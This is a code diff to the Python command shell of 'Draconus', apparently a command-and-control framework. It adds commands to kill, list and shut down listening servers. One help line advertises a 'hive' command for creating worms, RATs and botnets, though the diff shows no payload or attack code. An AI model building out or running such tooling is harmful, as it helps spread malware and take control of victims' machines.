@@ -173,8 +173,10 @@ def build_draco_shell(CeCe):
         print("****** clr           - Clear screen")
         print("****** exit          - Exit Comand Center. Draconus still working")
         print("****** make          - Creates new server. see: 'make --help' for instruction")
+        print("****** kill          - Delete server. Ex: 'kill MyServer' ")
         print("****** start <name>  - Start server listening. Ex: 'start MyServer' ")
         print("****** stop <name>   - Stop server listening. Ex: 'stop MyServer' ")
+        print("****** hive          - Creates worms, rats, botnet etc. see 'hive --help'")
     
     @draco_shell.command()
     def clr():
@@ -182,9 +184,31 @@ def build_draco_shell(CeCe):
     
     @draco_shell.command()
     @click.option("--config", "-c", required=False, is_flag=True, help="Show servers config")
-    def show(config):
+    @click.option("--types", "-t", is_flag=True, required=False, help="Show available servers type")
+    def show(config, types):
         if config:
             CeCe.send_msg("conf")
+        if types:
+            CeCe.send_msg("serv types")
+    
+    @draco_shell.command(context_settings={'help_option_names': ['-h', '--help']})
+    @click.argument("name")
+    def kill(name):
+        if name:
+            CeCe.send_msg(f"kill {name}")
+    
+    @draco_shell.command()
+    def theend():
+        print("[SYSTEM] Are you sure ? Draconus and all servers will be terminated !")
+        print("[SYSTEM] Y / N <<", end="")
+        confirm = input()
+        if confirm == "y":
+            CeCe.send_msg("DRACO STOP")
+            print("[SYSTEM] Put 'exit' . Command Center will not work without Draconus !!")
+        else:
+            return True
+
+
 
     @draco_shell.command()
     def test():
@@ -203,6 +227,13 @@ def build_draco_shell(CeCe):
     @click.option("--start", "-s", is_flag=True, required=False, help="Start Listening server immediately")
     @click.option("--no_print", "-np", is_flag=True, required=False, help="Prints only important message but still logs all messages")
     def make(serv_type, name, port, start, no_print):
+        """--------- MAKE function ------\n
+        --- make creates new server. Please see 'show --types' function for servers types\n
+        --- 'make <serv_type> <name> <port>'  - Creates New Server\n
+        --- ex: make Echo MyServer 1234
+        --- ex: make Echo MyServer 2222 -s   - starts listening immediately\n
+        --- ex: make Echo MyServer 2222 -s -np  - starts listening immediately and show only important messages\n
+        """
         config = {
             "SERV_TYPE" : serv_type,
             "NAME" : name,
@@ -245,7 +276,7 @@ def build_draco_shell(CeCe):
         if not config:
             print(f"[QUEEN] ERROR: Cant recive config server")
             return False
-        CeCe.Queen.accept_config(**config)
+        CeCe.Queen.hatchering(**config)
 
     
     @draco_shell.command()
